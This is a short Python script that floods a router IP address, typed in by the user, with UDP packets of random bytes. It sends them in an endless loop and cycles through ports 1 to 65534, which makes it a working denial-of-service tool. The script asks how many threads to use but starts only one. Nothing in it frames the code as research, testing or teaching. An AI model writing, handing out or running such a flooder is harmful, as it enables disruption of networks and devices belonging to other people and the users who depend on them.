#imports
import socket
import random
from threading import Thread
#defining socket and variables
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

bytes = random._urandom(1490)

ip = input("Router Ip To Flood: ")
port = 1
threads = int(input("Enter How Many Threads To use: "))

sent = 0
def flood():
    global ip, port , sent
    while True:
          sock.sendto(bytes,(ip,port))
          sent = sent + 1
          port = port + 1
          print("Sent %s packet to %s throught port: %s"%(sent,ip,port))
          if port == 65534:
                  port =1
threadlist = []
t = Thread(target=flood)
t.start()
threadlist.append(t)

